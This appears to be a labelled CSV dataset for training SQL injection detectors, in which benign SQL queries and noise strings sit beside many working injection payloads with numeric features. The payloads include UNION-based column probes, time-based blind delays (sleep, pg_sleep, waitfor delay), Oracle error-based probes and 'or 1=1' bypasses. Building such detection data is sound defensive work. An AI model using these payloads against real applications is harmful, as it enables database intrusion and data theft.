Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
select top 3 * from stood select * from brick 3select * from crack,0,select top from stood select from brick 3select from crack,66,10,0,0,0,0,13,0,3,48,6,0
18439608w,0,18439608w,9,1,0,0,0,0,0,0,0,1,0,0
select * from together where birthday in  ( select location from entire ) ,0,select from together where birthday in select location from entire,74,10,0,0,0,0,13,0,1,57,6,0
select * from sound where after not like 'alive%',0,select from sound where after not like alive,49,8,2,0,1,0,8,1,1,37,5,0
7.84149e+15,0,84149e,11,1,0,0,1,0,0,0,1,1,0,0
select * from bottom where smoke = 'mainly'  and  ( breathe = 'darkness' or store = 'forty' ) ,0,select from bottom where smoke mainly and breathe darkness or store forty,94,12,6,0,3,0,18,2,1,62,5,0
select top 3 * from full,0,select top from full,24,4,0,0,0,0,5,0,1,17,3,0
?s,1,,2,0,0,0,1,0,0,0,0,1,0,0
"   select employees.halfway, count ( orders.laborid )  as passfrom    ( ordersinner join enjoy on orders.forgetid  =  employees.dependid ) ",0,select employees halfway count orders laborid as passfrom ordersinner join enjoy on orders forgetid employees dependid,139,16,0,0,6,0,18,0,0,103,4,1
"-8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049#",1,where union all select,78,4,0,0,8,1,8,0,1,19,4,0
"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",1,or elt and,66,3,4,0,5,0,13,2,1,8,2,1
c/ coca de la piera 167,0,coca de la piera,23,4,0,0,0,0,5,0,1,14,0,0
"   select pick, thumb, vessels from horn where wooden  is null",0,select pick thumb vessels from horn where wooden is null,62,10,0,0,2,0,10,0,0,47,5,0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 4982 )  order by meta_id asc",0,select post_id meta_key meta_value from wp_postmeta where post_id in order by meta_id asc,102,13,0,0,8,0,15,0,0,71,7,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'knbx' like 'knbx",1,select dbms_pipe receive_message chr chr chr chr from dual and knbx like knbx,160,13,3,0,10,0,29,1,0,63,4,6
1'  )   as xwlf where 9424  =  9424,1,as xwlf where,35,3,1,0,1,0,7,0,0,11,2,0
"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",1,as eghl where union all select,77,6,0,1,5,1,11,0,1,25,5,0
d,0,,2,0,0,0,0,0,0,0,0,1,0,0
select * from still where center = 'consonant'  and  ( far = 'wonder' or pink = 'cast' ) ,0,select from still where center consonant and far wonder or pink cast,89,12,6,0,3,0,18,2,1,57,5,0
select * from  ( select mind from supply ) ,0,select from select mind from supply,43,6,0,0,0,0,9,0,1,30,4,0
"1""  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--",1,where union all select null null null null null null null null,86,12,0,1,8,1,9,0,2,51,12,0
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,or select from select sleep sddo,83,6,0,0,1,1,18,1,1,27,4,1
"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,where and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,350,23,0,1,26,1,74,1,2,86,9,10
select top 50 percent * from cook select * from pour fetch first 50 percent rows onlyselect top 3 * from per,0,select top percent from cook select from pour fetch first percent rows onlyselect top from per,108,16,0,0,0,0,21,0,3,79,8,0
select avg ( crack ) from lost select sum ( paper ) ,0,select avg crack from lost select sum paper,52,8,0,0,0,0,12,0,0,36,3,2
select avg ( rain ) from slipped,0,select avg rain from slipped,32,5,0,0,0,0,6,0,0,24,2,1
select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,1,select case when then else select from information_schema character_sets end,136,10,0,0,5,1,21,0,1,65,8,0
㞶,0,,1,0,0,0,0,0,0,0,0,0,0,0
"   select usual, exclaimed, occurfrom higher where list  is not null",0,select usual exclaimed occurfrom higher where list is not null,68,10,0,0,2,0,10,1,0,53,5,0
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,union all select null null null null null null null null null null,83,13,0,1,9,1,6,0,2,54,13,0
delete from came where same = 'adult',0,delete from came where same adult,37,6,2,0,1,0,6,0,0,28,3,0
"1""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--",1,where and,62,2,0,1,2,1,12,1,3,8,2,0
select depend ( s )  from larger left join,0,select depend from larger left join,42,6,0,0,0,0,8,0,0,31,4,1
1 and 2006  =  2006,1,and,19,1,0,0,1,0,4,1,0,3,0,0
select * from  ( select night from stick ) ,0,select from select night from stick,43,6,0,0,0,0,9,0,1,30,4,0
select * from  ( select basic from ever ) ,0,select from select basic from ever,42,6,0,0,0,0,9,0,1,29,4,0
5.12832e+15,0,12832e,11,1,0,0,1,0,0,0,1,1,0,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'jutx'  =  'jutx",1,select count from domain domains as t1 domain columns as t2 domain tables as t3 and jutx jutx,128,18,3,0,6,0,19,1,1,73,6,1
61877469v,0,61877469v,9,1,0,0,0,0,0,0,0,1,0,0
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,select from users where id or union select null version,84,10,0,1,4,2,17,1,3,46,7,1
lupien,0,lupien,6,1,0,0,0,0,0,0,0,6,0,0
select top 50 percent * from flight select * from notice fetch first 50 percent rows onlyselect top 3 * from wild,0,select top percent from flight select from notice fetch first percent rows onlyselect top from wild,113,16,0,0,0,0,21,0,3,84,8,0
1%'  )   or sleep  (  5  )  #,1,or sleep,29,2,1,0,2,1,7,1,0,7,1,1
1' or sleep  (  5  )  #,1,or sleep,23,2,1,0,1,1,6,1,0,7,1,1
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'hhbh'  =  'hhbh",1,and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and hhbh hhbh,140,17,4,0,11,0,21,2,1,74,4,1
"cardenal mendoza s/n, 7?h",0,cardenal mendoza,25,2,0,0,2,0,3,0,1,18,0,0
select * from raw where term = 'entirely' fetch first 3 rows only,0,select from raw where term entirely fetch first rows only,65,10,2,0,1,0,12,0,1,48,4,0
select avg ( blew )  from stage  select sum ( gold ) ,0,select avg blew from stage select sum gold,53,8,0,0,0,0,12,0,0,35,3,2
750,0,,3,0,0,0,0,0,0,0,0,0,0,0
"-6656""  )   union all select 3931#",1,union all select,34,3,0,1,1,1,5,0,1,14,3,0
"1   )    )    as gdcg where 2329  =  2329 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,as gdcg where and select count from generate_series,132,8,0,0,4,1,24,1,3,43,5,1
"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and,377,23,0,4,28,0,79,2,0,84,9,10
leiro,0,leiro,5,1,0,0,0,0,0,0,0,5,0,0
select avg ( thick )  from hall  select sum ( shaking ) ,0,select avg thick from hall select sum shaking,56,8,0,0,0,0,12,0,0,38,3,2
-7054  )   as gzvf where 9146  =  9146 or 3038  =  3038,1,as gzvf where or,55,4,0,0,2,0,11,1,1,13,3,0
1'||  (  select 'vxfx' where 7038  =  7038 and 9306  =  4187  )  ||',1,select vxfx where and,68,4,4,0,6,0,13,1,0,18,3,0
"1%'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",1,or select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and,280,13,4,0,10,0,46,2,2,51,8,3
rabanal morante,0,rabanal morante,15,2,0,0,0,0,1,0,0,14,0,0
18517,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi",1,and elt and ycgi ycgi,59,5,4,0,3,0,11,2,0,17,2,1
"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,select odud from dual where or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,179,25,3,0,11,1,30,1,3,94,10,1
"select * from train where with between ""dull"" and    ""period""",0,select from train where with between dull and period,61,9,0,4,0,0,9,1,1,44,6,0
?,1,,1,0,0,0,1,0,0,0,0,0,0,0
"  select windowid as id, plus as passage from frozen",0,select windowid as id plus as passage from frozen,52,9,0,0,1,0,9,0,0,41,4,0
"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",1,where union all select,70,4,1,0,4,1,9,0,3,19,4,0
select * from hungry,0,select from hungry,20,3,0,0,0,0,3,0,1,16,2,0
"-2951"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1,or utl_inaddr get_host_address chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,326,21,0,1,26,0,67,1,1,88,8,10
1  )   or sleep  (  5  )   and   (  2211  =  2211,1,or sleep and,49,3,0,0,1,0,11,2,0,10,2,1
plang_schallert@white-pearl-resort.kp,0,plang_schallert white pearl resort kp,37,5,0,0,3,0,0,0,2,32,0,0
select dayofweek ( curdate (   )  )  ;,0,select dayofweek curdate,38,3,0,0,1,0,7,0,0,22,1,0
"  select truckid as id, article as death from live",0,select truckid as id article as death from live,50,9,0,0,1,0,9,0,0,39,4,0
select between ( s )  from section select sides from managed,0,select between from section select sides from managed,60,8,0,0,0,0,10,0,0,47,5,0
-9389'  )   or 8859  =  3989--,1,or,30,1,1,0,1,1,5,1,3,2,0,0
"1%'  )   union all select null,null--",1,union all select null null,37,5,1,0,2,1,5,0,2,22,5,0
select top 3 * from son select * from race 3select * from year,0,select top from son select from race 3select from year,62,10,0,0,0,0,13,0,3,44,6,0
"1%'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,or dbms_pipe receive_message chr chr chr chr,135,7,1,0,12,1,26,1,2,36,1,6
fredes damas,0,fredes damas,12,2,0,0,0,0,1,0,0,11,0,0
tomi,0,tomi,4,1,0,0,0,0,0,0,0,4,0,0
"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --",1,as jmwr where rlike select case when then else 0x28 end,127,11,0,1,2,1,26,0,2,42,9,0
"insert into bus ( worry, voice, melted, express, shore, individual )  values  ( 'thick', 'cave'. quick', 'sense', 'broad', 'lucky', 'hunter' )  ",0,insert into bus worry voice melted express shore individual values thick cave quick sense broad lucky hunter,144,17,13,0,11,0,21,0,0,92,3,0
select * from  ( select wrapped from recall ) ,0,select from select wrapped from recall,46,6,0,0,0,0,9,0,1,33,4,0
-7984' order by 1--,1,order by,19,2,1,0,0,1,3,0,3,7,2,0
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,select from users where id or or,59,7,0,2,4,1,16,2,3,26,5,0
"select * from until where been between ""private"" and    ""piece""",0,select from until where been between private and piece,63,9,0,4,0,0,9,1,1,46,5,0
select species ( s )  from lamp select numeral ( s ) ,0,select species from lamp select numeral,53,6,0,0,0,0,12,0,0,36,3,0
select produce ( s ) from work inner join,0,select produce from work inner join,41,6,0,0,0,0,8,0,0,31,4,0
select * from flame where progress = 'push'  and  ( turn = 'perfect' or bound = 'seven' ) ,0,select from flame where progress push and turn perfect or bound seven,90,12,6,0,3,0,18,2,1,58,5,0
"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",1,and updatexml concat 0x2e 0x7171706a71 select elt 0x717a767a71 and gmld like gmld,186,12,0,4,7,0,29,2,0,49,4,3
select clearly ( s )  from somebody union,0,select clearly from somebody union,41,5,0,0,0,0,7,0,0,31,3,0
1' where 9003  =  9003 waitfor delay '0:0:5'--,1,where waitfor delay,46,3,3,0,3,1,7,0,2,17,1,2
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'cbnc' like 'cbnc,1,and cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric and cbnc like cbnc,389,25,4,0,24,0,81,2,0,90,10,10
valdivieso,0,valdivieso,10,1,0,0,0,0,0,0,0,10,0,0
select * from typical,0,select from typical,21,3,0,0,0,0,3,0,1,17,2,0
1'+  (  select twyt where 3376  =  3376 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',1,select twyt where and dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,383,24,2,0,27,0,77,1,2,106,10,12
"avda. de pablo iglesias, s/n 2?g",0,avda de pablo iglesias,32,4,0,0,3,0,5,0,1,22,0,0
select * from bigger where anyway = 'directly' limit 3,0,select from bigger where anyway directly limit,54,7,2,0,1,0,9,0,1,40,4,0
"1""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,and char char char char regexp_substring repeat left crypt_key char char char null null,252,14,0,1,17,1,50,1,2,72,4,11
select count ( distinct dry )  from sister,0,select count distinct dry from sister,42,6,0,0,0,0,7,0,0,32,3,1
-3044'  )   or 4999  =  3051#,1,or,29,1,1,0,2,1,5,1,1,2,0,0
select * from anyone 3 select * from base,0,select from anyone select from base,41,6,0,0,0,0,8,0,2,30,4,0
select * from west where studied between luck09/01/1996nodded and little15/31/1996front,0,select from west where studied between luck09 1996nodded and little15 1996front,87,11,0,0,0,0,9,1,5,57,5,0
select * from put where storm = 'silver' limit 3,0,select from put where storm silver limit,48,7,2,0,1,0,9,0,1,34,4,0
rgiva,0,rgiva,5,1,0,0,0,0,0,0,0,5,0,0
1'  )   where 4949  =  4949,1,where,27,1,1,0,1,0,5,0,0,5,0,0
select * from chamber where discovery = 'short' limit 3,0,select from chamber where discovery short limit,55,7,2,0,1,0,9,0,1,41,4,0
stacey@mediacar.la,0,stacey mediacar la,18,3,0,0,2,0,0,0,0,16,0,0
select count ( butid ) from film,0,select count butid from film,32,5,0,0,0,0,6,0,0,24,2,1
"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",1,as eizh where or make_set,81,5,0,1,4,1,15,1,3,20,3,1
"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",1,in boolean mode union all select,80,6,1,0,7,1,8,0,1,27,4,0
admin' or 1  =  1,1,admin or,17,2,1,0,1,0,4,1,0,7,1,0
select top 3 * from fall,0,select top from fall,24,4,0,0,0,0,5,0,1,17,3,0
padr pavajeau,0,padr pavajeau,13,2,0,0,0,0,1,0,0,12,0,0
select * from frighten where not figure = 'list'  and not apart = 'heavy',0,select from frighten where not figure list and not apart heavy,73,11,4,0,2,0,13,3,1,52,6,0
select * from loose where industry  between 10 and 20,0,select from loose where industry between and,53,7,0,0,0,0,9,1,1,38,5,0
"  select magic,perfectly,its from discover left join orders on down.broadid =  happened.consist order by occur.save",0,select magic perfectly its from discover left join orders on down broadid happened consist order by occur save,115,18,0,0,6,0,14,0,0,93,7,1
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1,or select from pg_sleep,61,4,1,0,2,0,13,1,0,19,3,1
"-7797'+  (  select oulr where 7091  =  7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",1,select oulr where union all select,106,6,1,0,10,1,11,0,2,29,5,0
select bank ( s )  from whale left join,0,select bank from whale left join,39,6,0,0,0,0,8,0,0,28,4,1
1.93755e+15,0,93755e,11,1,0,0,1,0,0,0,1,1,0,0
1 where 4153  =  4153 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,where and in char char char char char select case when then char else char end char char char char char,350,21,0,0,2,1,76,1,12,83,9,12
jesusa,0,jesusa,6,1,0,0,0,0,0,0,0,6,0,0
"-9289   )    )    or make_set  (  5101  =  9919,9919  )   and    (    (   8977  =  8977",1,or make_set and,87,3,0,0,4,0,15,2,1,12,2,1
